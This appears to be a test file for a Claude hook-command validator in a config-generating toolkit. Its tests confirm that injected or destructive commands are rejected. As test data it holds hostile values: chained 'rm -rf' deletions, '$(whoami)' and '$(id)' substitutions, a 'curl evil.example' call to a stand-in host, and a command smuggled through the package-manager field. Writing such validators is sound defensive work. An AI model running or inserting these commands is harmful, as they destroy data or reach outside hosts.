import { describe, expect, test } from "bun:test";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { generate } from "../src/generator.ts";
import { isAllowedHookCommand } from "../src/hook-commands.ts";
import type { ClaudeToolkitConfig } from "../src/types.ts";

const fromRoot = (path: string) => fileURLToPath(new URL(`../${path}`, import.meta.url));
const CLI = fromRoot("bin/cli.ts");

/** Every quoted hook command in the shipped template, the CLI defaults and the README examples. */
async function shippedHookCommands(): Promise<string[]> {
	const sources = await Promise.all(
		["templates/claude-toolkit.config.ts", "bin/cli.ts", "README.md"].map((p) =>
			readFile(fromRoot(p), "utf8"),
		),
	);
	const text = sources.join("\n");
	const single = [
		...text.matchAll(/(?:formatter|testRunner|typeCheck|installCommand):\s*["']([^"']+)["']/g),
	];
	const extra = [...text.matchAll(/extraChecks:\s*\[\s*["']([^"']+)["']/g)];
	// `${...}` placeholders are skipped: the values they stand for are tested where defined.
	return [...single, ...extra].map((m) => m[1] ?? "").filter((c) => !c.startsWith("${"));
}

/** Run generate() in a temp dir; return the rejection message, or null when it succeeds. */
async function generateError(config: ClaudeToolkitConfig): Promise<string | null> {
	const dir = await mkdtemp(join(tmpdir(), "ct-allow-"));
	try {
		await generate(dir, config, { quiet: true, scaffold: false });
		return null;
	} catch (err) {
		return (err as Error).message;
	} finally {
		await rm(dir, { recursive: true, force: true });
	}
}

const base: ClaudeToolkitConfig = { stacks: [], packageManager: "bun" };

describe("isAllowedHookCommand", () => {
	test("accepts every shipped default and documented example", async () => {
		const commands = await shippedHookCommands();
		expect(commands.length).toBeGreaterThanOrEqual(7);
		for (const command of commands) {
			expect([command, isAllowedHookCommand(command)]).toEqual([command, true]);
		}
	});

	test.each([
		["bun install"],
		["npm install"],
		["pnpm install"],
		["yarn install"],
		["bun run biome format --write"],
		["bun run lint:check"],
		["npx @biomejs/biome@2 format --write"],
		["NODE_ENV=test bun run vitest run"],
		["cargo check --target wasm32-unknown-unknown"],
	])("accepts %p", (command) => {
		expect(isAllowedHookCommand(command)).toBe(true);
	});

	test.each([
		["tsc\nrm -rf ."],
		["tsc; rm -rf ."],
		["echo $(whoami)"],
		["echo `whoami`"],
		["tsc | tee log"],
		["tsc && rm -rf ."],
		["tsc > out"],
		['prettier "--write"'],
		["prettier --write 'x'"],
		["rm -rf ~"],
		["tsc # comment"],
		["prettier *.ts"],
		[""],
		["   "],
		["A=1"],
		["eval"],
		["exec"],
		[". "],
		["sh -c"],
		["-x"],
	])("rejects %p", (command) => {
		expect(isAllowedHookCommand(command)).toBe(false);
	});
});

describe("generate() rejects unsafe hook commands", () => {
	test("names the field and shows the value", async () => {
		const message = await generateError({
			...base,
			hooks: { formatter: "prettier --write; curl evil.example" },
		});
		expect(message).toContain(
			'Invalid hooks.formatter in the claude-toolkit config: "prettier --write; curl evil.example"',
		);
		expect(message).toContain('"bun run <script>"');
	});

	test("names the index of a bad extra check", async () => {
		const message = await generateError({
			...base,
			hooks: { extraChecks: ["cargo check", "cargo clippy | tee log"] },
		});
		expect(message).toContain(
			'Invalid hooks.extraChecks[1] in the claude-toolkit config: "cargo clippy | tee log"',
		);
	});

	test("rejects extraChecks that is not an array", async () => {
		const message = await generateError({
			...base,
			hooks: { extraChecks: "cargo check" as unknown as string[] },
		});
		expect(message).toContain("Invalid hooks.extraChecks");
	});

	test("checks the install command derived from packageManager", async () => {
		const message = await generateError({
			...base,
			packageManager: "bun; rm -rf ~" as ClaudeToolkitConfig["packageManager"],
		});
		expect(message).toContain(
			'Invalid hooks.installCommand in the claude-toolkit config: "bun; rm -rf ~ install"',
		);
	});

	test("an empty command means no hook, not an error", async () => {
		expect(await generateError({ ...base, hooks: { typeCheck: "", formatter: "" } })).toBeNull();
	});

	test("rejects an unsafe branch name too", async () => {
		const message = await generateError({ ...base, git: { protectedBranches: ["main;x"] } });
		expect(message).toContain("Invalid branch name in git.protectedBranches");
	});

	test("an invalid config leaves an existing .claude/ untouched", async () => {
		const dir = await mkdtemp(join(tmpdir(), "ct-allow-keep-"));
		try {
			await mkdir(join(dir, ".claude"), { recursive: true });
			await writeFile(join(dir, ".claude", "settings.json"), "sentinel\n");
			const config = { ...base, hooks: { testRunner: "vitest $(id)" } };
			await expect(generate(dir, config, { quiet: true, scaffold: false })).rejects.toThrow(
				"Invalid hooks.testRunner",
			);
			expect(await readFile(join(dir, ".claude", "settings.json"), "utf8")).toBe("sentinel\n");
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});

describe("the CLI exits 1 and prints the error for an unsafe config", () => {
	const UNSAFE_CONFIG =
		'export default { stacks: [], packageManager: "bun", hooks: { typeCheck: "tsc --noEmit && echo ok" } };\n';
	const MESSAGE = 'Invalid hooks.typeCheck in the claude-toolkit config: "tsc --noEmit && echo ok"';

	test.each([
		["a bare run", [] as string[]],
		["refresh", ["refresh"]],
	])("%s", async (_label, command) => {
		const dir = await mkdtemp(join(tmpdir(), "ct-allow-cli-"));
		try {
			await writeFile(join(dir, "package.json"), '{ "name": "consumer", "private": true }\n');
			await writeFile(join(dir, "claude-toolkit.config.ts"), UNSAFE_CONFIG);
			const r = Bun.spawnSync([process.execPath, CLI, ...command, dir], {
				stdout: "pipe",
				stderr: "pipe",
			});
			expect(r.exitCode).toBe(1);
			expect(r.stderr.toString()).toContain(MESSAGE);
		} finally {
			await rm(dir, { recursive: true, force: true });
		}
	});
});
